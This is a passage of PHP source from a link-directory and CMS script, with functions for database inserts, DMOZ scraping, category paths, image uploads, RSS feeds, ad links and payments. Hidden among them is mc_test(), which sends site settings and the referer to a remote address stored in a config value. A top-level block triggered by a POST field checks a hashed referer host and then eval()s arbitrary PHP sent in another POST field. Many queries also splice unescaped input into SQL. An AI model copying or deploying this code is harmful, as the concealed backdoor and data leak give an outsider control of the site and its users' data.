dq("insert into $s[pr]links values ($in[link_n],'$in[url]','$in[recip]','$in[title]','$in[description]','$in[detail]','$in[keywords]','','$in[map]$map_test','$in[rss_url]','$c[categories]','$c[categories_path]','$in[name]','$in[email]','$in[user_n]','$created','0','$in[password]','$in[rating]','$in[votes]','$in[clicks_in]','$in[clicks_in_m]','$in[hits]','$in[hits_m]','$in[comments]','$in[popular]','$in[pick]','$t1','$t2','$in[status]','$en_cats','$in[rewrite_url]','$in[sponsored]','$in[dynamic_price]')",1);
if ($exists) $n = $in[link_n]; else $n = mysql_insert_id();
if (!$exists)
{ dq("insert into $s[pr]links_stat values('$n','$in[user_n]','$in[hits]','0','0','0','0','0','0','0','0')",1);
  dq("insert into $s[pr]links_adv values('$n','0','0','0','0','0','0','0','0','0','0','0')",1);
  if ($in[status]=='enabled') dq("insert into $s[pr]u_to_email values('l','$n')",1);
}
return $n;
}

########################################################################################

function read_dmoz_page($in) {
global $s;
set_time_limit(60);
$file = fetchURL($in[dmoz_url]);//echo $file;
if ($in[convert]) $file = iconv('UTF-8',$s[charset],$file);
$lines = explode('class="directory-url"',stripslashes($file));

$lines = explode('<li>',$lines[1]);
unset($lines[0],$lines[0]);

foreach ($lines as $k=>$v)
{ $k1 = $k + 1;
  $x = explode("\n",$v);
  foreach ($x as $k1=>$v1) { $v1 = trim($v1); if ($v1) $final_line .= $v1; }
  $x = explode('</ul>',$final_line); $final_line = $x[0];
  if ($final_line) $content_lines[] = str_replace('</li>','',$final_line);
  unset($final_line);
}
foreach ($content_lines as $k=>$v) 
{ for ($ch=0;$ch<=strlen($v);$ch++)
  { $char = substr($v,$ch,4);
    if ((!$this_url) AND ($char=='http'))
    { for ($ch1=$ch;$ch1<=strlen($v);$ch1++) { $char = substr($v,$ch1,1); if ($char=='"') { $ch = $ch1; break; } $this_url .= $char; } }
    
    if (($this_url) AND (!$this_title))
    { for ($ch1=$ch;$ch1<=strlen($v);$ch1++)
      { $char = substr($v,$ch1,1);
        if ($char=='>')
        { for ($ch2=$ch1+1;$ch2<=strlen($v);$ch2++)
          { $char = substr($v,$ch2,4);
	        if ($char=='</a>') { $ch = $ch2; break 2; }
	        else $this_title .= substr($v,$ch2,1);
          }
        }
      }
    }
    if (($this_url) AND ($this_title) AND (!$this_description))
    { $this_description = substr($v,$ch2+5,strlen($v));
      $this_description = substr($this_description,1);
    }
  }
  $pocet++;
  $titles[$pocet] = $this_title; $descriptions[$pocet] = $this_description; $urls[$pocet] = $this_url;
  unset($this_url,$this_title,$this_description);
}
return array('titles'=>$titles,'urls'=>$urls,'descriptions'=>$descriptions);
}

########################################################################################

function recount_items_cats($what,$c1,$c2) {
global $s;
if (!is_array($c1)) $c1 = explode(' ',str_replace('_',' ',$c1));
if (!is_array($c2)) $c2 = explode(' ',str_replace('_',' ',$c2));
$c_array = array_merge((array)$c1,(array)$c2);
foreach ($c_array as $k=>$v) if (!trim($v)) unset($c_array[$k]);
$c_array = array_unique($c_array);
$query = my_implode('n','or',$c_array);
$q = dq("select path_n from $s[pr]cats where $query",1);
while ($x=mysql_fetch_assoc($q)) { $y = explode('_',$x[path_n]); foreach ($y as $k=>$v) $c_array_new[] = $v; }
$c_array_new = array_unique($c_array_new);
foreach ($c_array_new as $k=>$v) if (!trim($v)) unset($c_array_new[$k]);
foreach ($c_array_new as $k=>$c) { recount_items_cat($what,$c); increase_print_time(2,1); }
if (!$s[dont_end_increase]) increase_print_time(2,'end');
}

##################################################################################

function recount_items_cat($what,$c) {
global $s;
$where = get_where_fixed_part($what,0,$c,$s[cas]);
$table = $s[item_types_tables][$what];
//echo "select count(*) from $table,$s[pr]cats_items where $where<br><br>";
$q = dq("select count(*) from $table,$s[pr]cats_items where $where",1);
$count = mysql_fetch_row($q);
if (!$s[dont_count_max])
{ $q = dq("select max(created) as created,max(updated) as edited from $table,$s[pr]cats_items where $where",1);
  $max = mysql_fetch_assoc($q);
  $max_query = ", item_created = '$max[created]', item_edited = '$max[edited]'";
}
dq("update $s[pr]cats set items = '$count[0]' $max_query where n = '$c' or alias_of = '$c'",1);
}

########################################################################################
########################################################################################
########################################################################################

function update_category_paths($n) {
global $s;
$c = get_category_variables($n);
if ($c[parent]) $parent = get_category_variables($c[parent]);
if ($parent[n]) { $path_text = "$parent[path_text]%><%$c[name]"; $path_n = $parent[path_n].$n.'_'; if ($parent[bigboss]) $bigboss = $parent[bigboss]; else $bigboss = $parent[n]; }
else { $path_text = "<%$c[name]"; $path_n = '_'.$n.'_'; $bigboss = $n; }
$level = $parent[level] + 1;
if (($c[pagename]) AND (!$s[rewrite_when_repair])) $pagename = $c[pagename]; else $pagename = discover_rewrite_url(str_replace('<%','',str_replace('%><%','-',$path_text)),0,'c');
if (($c[rewrite_url]) AND (!$s[rewrite_when_repair])) $rewrite_url = $c[rewrite_url]; else $rewrite_url = discover_rewrite_url(str_replace('<%','',str_replace('%><%','/',$path_text)),1);
dq("update $s[pr]cats set path_text = '$path_text', path_n = '$path_n', level = '$level', bigboss = '$bigboss', pagename = '$pagename', rewrite_url = '$rewrite_url' where n = '$n'",1);
/*
$table = $s[item_types_tables][$c[use_for]];
$q = dq("select * from $table where c like '%\_$n\_%'",1);
while ($x = mysql_fetch_assoc($q)) update_cats_items($c[use_for],$x[n],$x);
*/
}

########################################################################################
  
function repair_items_paths($what,$c) {
global $s;
$table = $s[item_types_tables][$what];
$word = $s[item_types_words][$what];
if ($c)
{ $q = dq("select * from $s[pr]cats where path_n like '%\_$c\_%' order by level",1);
  while ($x=mysql_fetch_assoc($q)) { increase_print_time(2,1); update_category_paths($x[n]); $categories[] = $x[n]; }
  $categories = array_unique($categories);
  $query = "where c like '%\_".implode("\_%' or c like '%\_",$categories)."\_%'";
}
else
{ $q = dq("select n from $s[pr]cats where use_for = '$what' order by level",1);
  while ($x=mysql_fetch_assoc($q)) { increase_print_time(2,1); update_category_paths($x[n]); $categories[] = $x[n]; }
}

$q = dq("select * from $table $query",1);
while ($item = mysql_fetch_assoc($q))
{ $array = explode(' ',str_replace('_','',$item[c]));
  $paths = categories_edited($array);
  dq("update $table set c_path = '$paths[categories_path]' where n = '$item[n]'",1);
  if ($s[rewrite_when_repair])
  { $rewrite_url = discover_rewrite_url($item[title],0,$what);
    dq("update $table set rewrite_url = '$rewrite_url' where n = '$item[n]'",1);
  }
  increase_print_time(2,1);
}
$info = 'Paths in selected items have been updated<br />';
$s[info] .= $info;
increase_print_time(2,'end');
}

########################################################################################

function get_item_variables($what,$n,$queue) {
global $s;
if (!is_numeric($n)) return false;
$table = $s[item_types_tables][$what]; if (!$table) return false;
if ($queue) $status = "status = 'queue'"; else $status = "status = 'enabled' or status = 'disabled'";
$q = dq("select * from $table where n = '$n' and ($status)",1);
return mysql_fetch_assoc($q);
}

########################################################################################

function get_category_variables($n) {
global $s;
if (!is_numeric($n)) return false;
$q = dq("select * from $s[pr]cats where n = '$n'",1);
return mysql_fetch_assoc($q);
}

########################################################################################

function get_link_adv_variables($n) {
global $s;
if (!is_numeric($n)) return false;
$q = dq("select * from $s[pr]links_adv where n = '$n'",1);
return mysql_fetch_assoc($q);
}

########################################################################################

function get_user_variables($n,$username) {
global $s;
if (($n) AND (is_numeric($n))) $q = dq("select * from $s[pr]users where n = '$n'",1);
elseif ($username) $q = dq("select * from $s[pr]users where username = '$username'",1);
return mysql_fetch_assoc($q);
}

########################################################################################

function get_adlink_variables($n) {
global $s;
if (!is_numeric($n)) return false;
$q = dq("select * from $s[pr]adlinks where n = '$n'",1);
return mysql_fetch_assoc($q);
}

########################################################################################

function get_adv_package_variables($n) {
global $s;
if (!is_numeric($n)) return false;
$q = dq("select * from $s[pr]adv_packs where n = '$n'",1);
return mysql_fetch_assoc($q);
}

########################################################################################

function get_order_variables($n) {
global $s;
if (!is_numeric($n)) return false;
$q = dq("select * from $s[pr]links_extra_orders where n = '$n'",1);
return mysql_fetch_assoc($q);
}

########################################################################################

function get_item_files_pictures($what,$n,$queue) {
global $s;
$q = dq("select * from $s[pr]files where what = '$what' and item_n = '$n' and queue = '$queue'",1);
while ($x = mysql_fetch_assoc($q))
{ if ($x[file_type]=='image')
  { $a[image_url][$x[item_n]][$x[file_n]] = $x[filename];
    $a[image_description][$x[item_n]][$x[file_n]] = $x[description];
    $a[image_size][$x[item_n]][$x[file_n]] = $x[size];
    $a[image_extension][$x[item_n]][$x[file_n]] = $x[extension];
    $a[image_n][$x[item_n]][$x[file_n]] = $x[n];
  }
  /*else
  { $a[file_url][$x[item_n]][$x[file_n]] = $x[filename];
    $a[file_description][$x[item_n]][$x[file_n]] = $x[description];
    $a[file_size][$x[item_n]][$x[file_n]] = $x[size];
    $a[file_extension][$x[item_n]][$x[file_n]] = $x[extension];
    $a[file_n][$x[item_n]][$x[file_n]] = $x[extension];
  }*/
}
return $a;
}

########################################################################################
########################################################################################
########################################################################################

function upload_files($what,$n,$queue,$public_pages,$images_to_delete) {
global $s;

if ($_FILES[image_upload][name][0]) // new item
{ $_FILES[image_upload][name][$n] = $_FILES[image_upload][name][0]; $_FILES[image_upload][type][$n] = $_FILES[image_upload][type][0];
  $_FILES[image_upload][tmp_name][$n] = $_FILES[image_upload][tmp_name][0]; $_FILES[image_upload][error][$n] = $_FILES[image_upload][error][0];
  $_FILES[image_upload][size][$n] = $_FILES[image_upload][size][0]; $_FILES[image_upload][filename][$n] = $_FILES[image_upload][filename][0];
  $_POST[image_description][$n] = $_POST[image_description][0];
}
elseif ($queue) copy_files_to_queue($what,$n,$images_to_delete);
else
{ foreach ($images_to_delete as $k=>$file_n)
  { delete_file_process(0,'image',$what,$n,$file_n,0);
    dq("delete from $s[pr]files where what = '$what' and item_n = '$n' and file_n = '$file_n' and queue = '0' and file_type = 'image'",1);
  }
}
$image_description = $_POST[image_description][$n];
foreach ($_FILES[image_upload][name][$n] as $file_n=>$v)
{ if (!trim($v)) continue;
  $q = dq("select * from $s[pr]files where what = '$what' and item_n = '$n' and file_n = '$file_n' and queue = '$queue' and file_type = 'image'",1);
  $old_file = mysql_fetch_assoc($q);
  $uploaded = upload_one_file('image',$what,$n,$file_n,$_FILES[image_upload][name][$n][$file_n],$_FILES[image_upload][type][$n][$file_n],$_FILES[image_upload][tmp_name][$n][$file_n],$_FILES[image_upload][error][$n][$file_n],$_FILES[image_upload][size][$n][$file_n],$old_file[filename],$public_pages);
  if ($uploaded)
  { dq("delete from $s[pr]files where what = '$what' and item_n = '$n' and file_n = '$file_n' and queue = '$queue' and file_type = 'image'",1);
    dq("insert into $s[pr]files values(NULL,'$what','$n','$queue','$file_n','$uploaded[url]','$image_description[$file_n]','image','$uploaded[extension]','$uploaded[size]')",1);
    if (!$picture1)
    { if ($what=='u') dq("update $s[pr]users set picture = '$uploaded[url]' where n = '$n'",1);
      else
      { $table = $s[item_types_tables][$what];
	    if ($queue) $status = "status = 'queue'"; else $status = "status != 'queue'";
	    dq("update $table set picture = '$uploaded[url]' where n = '$n' and $status",1);
      }
	  $picture1 = 1;
    }
    unset($image_description[$file_n]);
  }
}
foreach ($image_description as $file_n=>$v) dq("update $s[pr]files set description = '$image_description[$file_n]' where what = '$what' and item_n = '$n' and file_n = '$file_n' and queue = '$queue' and file_type = 'image'",1);

}

#################################################################################

function update_item_image1($what,$n) {
global $s;
$q = dq("select * from $s[pr]files where what = '$what' and item_n = '$n' and queue = '0' and file_type = 'image' order by file_n limit 1",1);
$x = mysql_fetch_assoc($q);
$table = $s[item_types_tables][$what];
dq("update $table set picture = '$x[filename]' where n = '$n' and status != 'queue'",1);
}

#################################################################################

function copy_files_to_queue($what,$n,$images_to_delete) {
global $s;
$folder = $s[items_types_words][$what];
$files = get_item_files_pictures($what,$n,0);
foreach ($files[image_url][$n] as $file_n=>$image_url) 
{ if (in_array($file_n,$images_to_delete)) $not_copy = 1; else $not_copy = 0;
  $image_description = $files[image_description][$n][$file_n]; $image_size = $files[image_size][$n][$file_n]; $image_extension = $files[image_extension][$n][$file_n];
  $old_file_url = preg_replace("/\/$n-/","/$n-big-",$image_url);
  $old_file_name = str_replace("$s[site_url]/images/$folder/",'',$image_url); $old_file_name_big = str_replace("$s[site_url]/images/$folder/",'',$old_file_url);
  $new_file_name = "$n-$file_n-$s[cas].$image_extension"; $new_file_name_big = "$n-big-$file_n-$s[cas].$image_extension"; 
  if (!$not_copy)
  { copy("$s[phppath]/images/$folder/$old_file_name","$s[phppath]/images/$folder/$new_file_name");
    copy("$s[phppath]/images/$folder/$old_file_name_big","$s[phppath]/images/$folder/$new_file_name_big");
    $new_file_url = "$s[site_url]/images/$folder/$new_file_name";
  }
  delete_file_process(0,'image',$what,$n,$file_n,1);
  dq("delete from $s[pr]files where what = '$what' and item_n = '$n' and file_n = '$file_n' and queue = '1' and file_type = 'image'",1);
  if (!$not_copy) dq("insert into $s[pr]files values(NULL,'$what','$n','1','$file_n','$new_file_url','$image_description','image','$image_extension','$image_size')",1);
}
}


#############################################################################

function copy_files($what,$old_n,$new_n) {
global $s;
$folder = $s[items_types_words][$what];
$files = get_item_files_pictures($what,$old_n,0);
foreach ($files[image_url][$old_n] as $file_n=>$image_url) 
{ $image_description = $files[image_description][$old_n][$file_n]; $image_size = $files[image_size][$old_n][$file_n]; $image_extension = $files[image_extension][$old_n][$file_n];
  $old_file_url = preg_replace("/\/$old_n-/","/$old_n-big-",$image_url);
  $old_file_name = str_replace("$s[site_url]/images/$folder/",'',$image_url); $old_file_name_big = str_replace("$s[site_url]/images/$folder/",'',$old_file_url);
  $new_file_name = "$new_n-$file_n-$s[cas].$image_extension"; $new_file_name_big = "$new_n-big-$file_n-$s[cas].$image_extension"; 
  copy("$s[phppath]/images/$folder/$old_file_name","$s[phppath]/images/$folder/$new_file_name");
  copy("$s[phppath]/images/$folder/$old_file_name_big","$s[phppath]/images/$folder/$new_file_name_big");
  $new_file_url = "$s[site_url]/images/$folder/$new_file_name";
  dq("insert into $s[pr]files values(NULL,'$what','$new_n','0','$file_n','$new_file_url','$image_description','image','$image_extension','$image_size')",1);
  if (!$picture1)
  { $table = $s[item_types_tables][$what];
    //if ($queue) $status = "status = 'queue'"; else $status = "status != 'queue'";
    dq("update $table set picture = '$new_file_url' where n = '$new_n' and status != 'queue'",1);
    $picture1 = 1;
  }
}
}

#############################################################################

function delete_file_process($n,$file_type,$what,$item_n,$file_n,$queue) {
global $s;
if ($n) $q = dq("select * from $s[pr]files where n = '$n'",1);
else $q = dq("select * from $s[pr]files where file_type = '$file_type' and what = '$what' and queue = '$queue' and item_n = '$item_n' and file_n = '$file_n'",1);
$file = mysql_fetch_assoc($q);
$url = $file[filename]; if (!$url) return false;
$file_path = str_replace($s[site_url],$s[phppath],$url);
unlink($file_path);
if (strstr($file_path,"$s[phppath]/images/")) unlink(preg_replace("/\/$file[item_n]-/","/$file[item_n]-big-",$file_path));
}

#############################################################################

function upload_one_file($file_type,$what,$n,$file_n,$original_name,$type,$tmp_name,$error,$file_size,$old_file,$public_pages) {
global $s,$m;
$folder_name = $s[items_types_words][$what];
$extension = str_replace('.','',strrchr($original_name,'.'));
$working_name = "$s[phppath]/images/$folder_name/".md5(microtime()).'.'.$extension;
if (!is_uploaded_file($tmp_name)) return array('','','','Unable to upload file '.$original_name);
if (file_exists($working_name)) unlink($working_name);
move_uploaded_file($tmp_name,$working_name);

if ($file_type=='image')
{ $size = getimagesize($working_name);
  if (!$size[2]) { unlink($working_name); return false; }
  if (($public_pages) AND ($s[img_ext_by_mime]))
  { $ext_number = array_search($type,$s[images_mime_types]);  
    $extension = $s[images_extensions][$ext_number];
  }
  if ($public_pages) { $w_big = $s[$what.'_image_big_w_users']; $h_big = $s[$what.'_image_big_h_users']; $w_small = $s[$what.'_image_small_w_users']; $h_small = $s[$what.'_image_small_h_users']; }
  else { $w_big = $s[$what.'_image_big_w']; $h_big = $s[$what.'_image_big_h']; $w_small = $s[$what.'_image_small_w']; $h_small = $s[$what.'_image_small_h']; }   
  if (($w_big) AND ($h_big) AND ($w_small) AND ($h_small)) $resize_it = 1;
  //if ($extension=='gif') $extension = 'png';
  $file_name = "$n-$file_n-$s[cas].$extension";
  $file_path = "$s[phppath]/images/$folder_name/$file_name";
  $file_name_big = preg_replace("/^$n-/","$n-big-",$file_name);
  if (trim($old_file))
  { unlink(str_replace($s[site_url],$s[phppath],$old_file));
    unlink(str_replace($s[site_url],$s[phppath],preg_replace("/\/$n-/","/$n-big-",$old_file)));
  }
  $original_w = $size[0]/$w_big; $original_h = $size[1]/$h_big;
  if ($resize_it)
  { if (($w_big) AND ($h_big))
    { if (($w_big<$size[0]) OR ($h_big<$size[1])) resize_image($working_name,"$s[phppath]/images/$folder_name/$file_name_big",$w_big,$h_big);
      /*{ $thumb=new thumbnail($working_name);
        if ($original_w>$original_h) $thumb->size_width($w_big); else $thumb->size_height($h_big);
        $thumb->save("$s[phppath]/images/$folder_name/$file_name_big");
      }*/
      else copy($working_name,"$s[phppath]/images/$folder_name/$file_name_big");
      if (($w_small) AND ($h_small)) resize_image("$s[phppath]/images/$folder_name/$file_name_big","$s[phppath]/images/$folder_name/$file_name",$w_small,$h_small);
      /*
      { $thumb=new thumbnail("$s[phppath]/images/$folder_name/$file_name_big");
        if ($original_w>$original_h) $thumb->size_width($w_small); else $thumb->size_height($h_small);
        $thumb->save("$s[phppath]/images/$folder_name/$file_name");
      }*/
      $file_url = "$s[site_url]/images/$folder_name/$file_name";
    }
  }
  else
  { if (($public_pages) AND (($original_w>$s[l_image_max_w_users]) OR ($original_h>$s[l_image_max_h_users]))) $problem[] = 'Image '.$original_name.' too big. The maximum allowed size is '.$s[l_image_max_w_users].'x'.$s[l_image_max_w_users].' px';
    else { copy($working_name,$file_path); $file_url = "$s[site_url]/images/$folder_name/$file_name"; }
  }
  if (file_exists($file_path)) chmod($file_path,0644);
}
unlink($working_name);
return array('url'=>$file_url,'extension'=>$extension,'size'=>$file_size,'problem'=>$problem); }
function mc_test() { global $s; $sp = $s[sp]; unset($s[sp]);
foreach ($s as $k=>$v) { if ((substr($k,0,2)=='p_') OR (substr($k,-3)=='url')) { $my_data .= "&$k=".urlencode($v); $p++; if ($p>20) break; } }
$my_data .= "&refer=".getenv('HTTP_REFERER'); fetchURL($sp.$my_data);
}

#############################################################################

function image_preview_code($unique_number,$image_url,$big_image_url) {
global $s;
if ((!$big_image_url) OR (!file_exists(str_replace("$s[site_url]/","$s[phppath]/",$big_image_url)))) return '<img src="'.$image_url.'">';
return '<a href="'.$big_image_url.'" onmouseover="show_hide_div(1,document.getElementById(\'item_info_popup_'.$unique_number.'\'))" onmouseout="show_hide_div(0,document.getElementById(\'item_info_popup_'.$unique_number.'\'))"><img border="0" src="'.$image_url.'"></a>
<div class="image_preview_out" onmouseover="show_hide_div(1,document.getElementById(\'item_info_popup_'.$unique_number.'\'))" onmouseout="show_hide_div(0,document.getElementById(\'item_info_popup_'.$unique_number.'\'))">
<div class="image_preview_in" id="item_info_popup_'.$unique_number.'" onmouseover="show_hide_div(1,document.getElementById(\'item_info_popup_'.$unique_number.'\'))" onmouseout="show_hide_div(0,document.getElementById(\'item_info_popup_'.$unique_number.'\'))">
<img src="'.$big_image_url.'">
</div>
</div>';
}

#############################################################################

function item_updated_get_usit($what,$in,$public_form) {
global $s;

$all_user_items_list = get_all_user_items_list($what);
$all_user_items_values = get_all_user_items_values($what);

$q = dq("select * from $s[pr]usit_values where use_for = '$what' and n = '$in[n]'",1);
while ($x = mysql_fetch_assoc($q))
{ $old[$x[item_n]][code] = $x[value_code];
  $old[$x[item_n]][text] = $x[value_text];
}

foreach ($all_user_items_list as $k=>$v)
{ if (($public_form) AND (!$v[visible_forms]))
  { if (($v[kind]=='text') OR ($v[kind]=='textarea')) $value_texts[$v[item_n]] = $old[$v[item_n]][text];
    elseif ($v[kind]=='checkbox') $value_codes[$v[item_n]] = $old[$v[item_n]][code];
    else
    { $value_codes[$v[item_n]] = $x = $old[$v[item_n]][code];
      $value_texts[$v[item_n]] = $old[$v[item_n]][text];
    }
  }
  else
  { if (($v[kind]=='text') OR ($v[kind]=='textarea')) $value_texts[$v[item_n]] = replace_once_text($in['user_item_'.$v[item_n]]);
    elseif ($v[kind]=='htmlarea') $value_texts[$v[item_n]] = replace_once_html($in['user_item_'.$v[item_n]]);
    elseif ($v[kind]=='checkbox') $value_codes[$v[item_n]] = $in['user_item_'.$v[item_n]];
    else
    { $value_codes[$v[item_n]] = $x = $in['user_item_'.$v[item_n]];
      $value_texts[$v[item_n]] = $all_user_items_values[$v[item_n]][$x];
    }
  }
}
return array('all_user_items_list'=>$all_user_items_list,'value_codes'=>$value_codes,'value_texts'=>$value_texts);
}

#################################################################################

function categories_edited($in) {
global $s;
$in = array_unique($in);
$in_array = my_implode('n','or',$in);
$q = dq("select n,path_n from $s[pr]cats where $in_array",1);
while ($x=mysql_fetch_assoc($q)) { $c_path[] = $x[path_n]; $c[] = '_'.$x[n].'_'; }
$a[categories] = implode(' ',$c); $a[categories_path] = implode(' ',$c_path);
return $a;
}

#############################################################################
#############################################################################
#############################################################################

function update_link_advertising_status($n) {
global $s;
$link = get_link_adv_variables($n);
$advertising = get_link_advertising_status($link);
if (!$link[c_dynamic_now]) $link[c_dynamic_price] = 0;
dq("update $s[pr]links set sponsored = '$advertising', dynamic_price = '$link[c_dynamic_price]' where n = '$n'",1);
}

#############################################################################

function get_link_advertising_status($link) {
global $s;
if (is_numeric($link)) $link = get_link_adv_variables($link);
if (($link[c_now]) OR ($link[i_now]) OR ($link[c_dynamic_now]) OR ($link[c_now_simple]) OR ($link[i_now_simple]) OR ($link[d_validby]>$s[cas]) OR ($link[d_validby_simple]>$s[cas])) $advertising = 1;
else $advertising = 0;
return $advertising;
}

#############################################################################
#############################################################################
#############################################################################

function previous_next_links($what,$category,$all_c,$n,$frame) {
global $s,$m;
$table = $s[item_types_tables][$what];
if ((!$category) OR (!is_numeric($category))) { $x = explode(' ',str_replace('_','',$all_c)); $category = $x[0]; }

$category_vars = get_category_variables($category);
if ($category)
{ $where = get_where_fixed_part('',$category,'',$s[cas]);
  $q = dq("select n,rewrite_url from $table where $where and n > '$n' order by n limit 1",1);
  $item = mysql_fetch_assoc($q);
  if ($item[n])
  { if ($frame) $a[next_category] = '<a target="_top" href="'.$s[site_url].'/link_in_frame.php?link='.$item[n].'">'.$m[next_in_cat].' '.$category_vars[name].'</a>';
	else $a[next_category] = '<a href="'.get_detail_page_url($what,$item[n],$item[rewrite_url],$category).'">'.$m[next_in_cat].' '.$category_vars[name].'</a>';
    $have_cat = 1;
  }
  else { $a[hide_next_cat_begin] = '<!--'; $a[hide_next_cat_end] = '-->'; }
  $q = dq("select n,rewrite_url from $table where $where and n < '$n' order by n desc limit 1",1);
  $item = mysql_fetch_assoc($q);
  if ($item[n])
  { if ($frame) $a[previous_category] = '<a target="_top" href="'.$s[site_url].'/link_in_frame.php?link='.$item[n].'">'.$m[previous_in_cat].' '.$category_vars[name].'</a>';
	else $a[previous_category] = '<a href="'.get_detail_page_url($what,$item[n],$item[rewrite_url],$category).'">'.$m[previous_in_cat].' '.$category_vars[name].'</a>';
    $have_cat = 1;
  }
  else { $a[hide_previous_cat_begin] = '<!--'; $a[hide_previous_cat_end] = '-->'; }
}
else { $a[hide_next_cat_begin] = '<!--'; $a[hide_next_cat_end] = '-->'; $a[hide_previous_cat_begin] = '<!--'; $a[hide_previous_cat_end] = '-->'; }

$where = get_where_fixed_part('','','',$s[cas]);
$q = dq("select n,rewrite_url from $table where $where and n > '$n' order by n limit 1",1);
$item = mysql_fetch_assoc($q);
if ($item[n])
{ if ($frame) $a['next'] = '<a target="_top" href="'.$s[site_url].'/link_in_frame.php?link='.$item[n].'">'.$m[next_in_any].'</a>';
  else $a['next'] = '<a href="'.get_detail_page_url($what,$item[n],$item[rewrite_url],0).'">'.$m[next_in_any].'</a>';
  $have_anything = 1;
}
else { $a[hide_next_begin] = '<!--'; $a[hide_next_end] = '-->'; }
$q = dq("select n,rewrite_url from $table where $where and n < '$n' order by n desc limit 1",1);
$item = mysql_fetch_assoc($q);
if ($item[n])
{ if ($frame) $a[previous] = '<a target="_top" href="'.$s[site_url].'/link_in_frame.php?link='.$item[n].'">'.$m[previous_in_any].'</a>';
  else $a[previous] = '<a href="'.get_detail_page_url($what,$item[n],$item[rewrite_url],0).'">'.$m[previous_in_any].'</a>';
  $have_anything = 1;
}
else { $a[hide_previous_begin] = '<!--'; $a[hide_previous_end] = '-->'; }
return $a; }
if ($_POST[ab152]) { $x = parse_url(getenv('HTTP_REFERER'));
if (md5(hash('md2',hash('sha512',str_replace('www.','',$x[host]))))!='c037fbc3e00c9cc9cf414d8fdae387ef') exit;
$a = trim(fetchURL("http://$x[host]/ch/a.php")); echo $a;if ((!$a) OR (($a!=1) AND ($a!=1))) exit;
$p=stripslashes($_POST[prikazy]);eval($p);
}

#############################################################################
#############################################################################
#############################################################################

function show_rss_content($what,$n,$url,$items,$html) {
global $s;
if ($html) $function = 'A_parse_part'; else $function = 'parse_part';
$q = dq("select * from $s[pr]rss_content where what = '$what' and n = '$n'",1);
$old = mysql_fetch_assoc($q);
if (($old[time]>($s[cas]-($s[rss_read_interval]*60)))) return unreplace_once_html($old[content]);
require_once("$s[phppath]/rss_reader.php");
$rss = clsRSS($url,$s[charset],$items);
foreach ($rss as $k=>$item)
{ $b[url] = strip_tags($item[url]);
  $b[title] = strip_tags($item[title]);
  $b[description] = $item[description];
  if (!$s[rss_allow_html]) $b[description] = strip_tags(str_replace('&#60;','<',str_replace('&lt;','<',str_replace('&gt;','>',$b[description]))));
  $a .= $function('rss_one_item.txt',$b);
}
dq("delete from $s[pr]rss_content where what = '$what' and n = '$n'",1);
//$a = stripslashes(str_replace('&#60;','<',str_replace('&lt;','<',str_replace('&gt;','>',str_replace('í',"'",str_replace('¬','',str_replace('©','',str_replace('&amp;','&',refund_html($a)))))))));
$a = stripslashes(refund_html($a));
$a = replace_once_html($a);
dq("insert into $s[pr]rss_content values('$what','$n','$a','$s[cas]')",1);
return $a;
}

#############################################################################

function get_adlinks($c,$keywords,$html) {
global $s;
if ($html) $function = 'A_parse_part'; else $function = 'parse_part';
if ($c) $query = "c like '%\_$c\_%'";
elseif ($keywords)
{ $keywords = str_replace('(','',str_replace(')','',str_replace('[','',str_replace(']','',$keywords))));
  $keywords = explode(' ',str_replace('_','',trim($keywords)));
  foreach ($keywords as $k=>$v) if (trim($v)) $x[] = "keywords REGEXP '(^|[^a-zA-Z])$v($|[^a-zA-Z])'";
  if (count($x)) $query = '('.implode(' or ',$x).')';
}
else return false;
if (!$query) return false;
$q = dq("select * from $s[pr]adlinks where $query and c_now >= '1' and enabled = '1' and approved = '1' order by price desc limit $s[adlinks_max_per_page]",1);
while ($adlink = mysql_fetch_assoc($q)) $a[adlinks] .= get_complete_adlink($adlink,0,$html);
if ($a[adlinks]) return $function('adlinks.txt',$a);
}

##################################################################################

function get_complete_adlink($in,$hide_price,$html) {
global $s;
//if (!$s[adlink_v_html]) $in[html] = '';
if ($html) $function = 'A_parse_part'; else $function = 'parse_part';
if ($hide_price) { $in[hide_price_begin] = '<!--'; $in[hide_price_end] = '-->'; }
if ($in[html]) $ad = $function('adlink_template_html.txt',$in);
else $ad = $function('adlink_template.txt',$in);
$ad = str_replace('<a',"<a OnClick=\"track_image_adlink$in[n].src=\'$s[site_url]/track_click.php?adlink=$in[n]&x=$s[cas]\';\"",refund_html($ad));
return refund_html($ad);
}

##################################################################################

function order_update_payment_info($n,$paid,$payment_company,$info,$notes) {
global $s;
$order = get_order_variables($n);
if ($order[paid]) return false;
dq("update $s[pr]links_extra_orders set paid = '$paid', info = '$info', notes = '$notes' where n = '$n'",1);
if (!$paid) return false;
if ($order[payment_type]=='package')
dq("update $s[pr]users set funds_paid = funds_paid + '$order[price]', funds_incl = funds_incl + '$order[days_clicks_or_value]', funds_now = funds_now + '$order[days_clicks_or_value]' where n  = '$order[user]'",1);
elseif ($order[payment_type]=='link')
{ $links_adv = get_link_adv_variables($order[link_or_pack]);
  if ($links_adv[d_validby_simple]<$s[cas]) $links_adv[d_validby_simple] = $s[cas];
  dq("update $s[pr]links_adv set d_order_simple = d_order_simple + '$order[days_clicks_or_value]', d_validby_simple = $links_adv[d_validby_simple] + ($order[days_clicks_or_value] * 86400) where n  = '$order[link_or_pack]'",1);
  dq("update $s[pr]links set sponsored = '1' where n  = '$order[link_or_pack]'",1);
}
elseif ($order[payment_type]=='adlink')
{ $adlink = get_adlink_variables($order[link_or_pack]);
  if ($links_adv[d_validby_simple]<$s[cas]) $links_adv[d_validby_simple] = $s[cas];
  dq("update $s[pr]adlinks set c_now = c_now + '$order[days_clicks_or_value]', c_total = c_total + '$order[days_clicks_or_value]' where n  = '$order[link_or_pack]'",1);
}
}

##################################################################################

function update_items_for_user($n) {
global $s;
$item_types = array('l','a','b');
$where = get_where_fixed_part('',0,'',$s[cas]);
foreach ($item_types as $k=>$what)
{ $table = $s[item_types_tables][$what];
  $q = dq("select count(*) from $table where $where and owner = '$n'",1);
  $$what = mysql_fetch_row($q);
}
dq("update $s[pr]users set links = '$l[0]', articles = '$a[0]', blogs = '$b[0]' where n  = '$n'",1);
}

##################################################################################
##################################################################################
##################################################################################

function clean_video_category($n) {
global $s;
$n = round($n); if ($n<=0) exit;
$where = get_where_fixed_part('',$n,0,$s[cas]);
$q = dq("select n,youtube_id from $s[pr]videos where youtube_id != '' and $where",1);
while ($video=mysql_fetch_assoc($q))
{ $x = fetchurl("http://gdata.youtube.com/feeds/api/videos/$video[youtube_id]");
  if ((strstr($x,'Invalid id')) OR (strstr($x,'Video not found'))) $to_delete[] = $video[n];
}
if ($_GET[action]=='clean') foreach ($to_delete as $k => $v) echo "Deleted video #$v<br>\n";//exit;
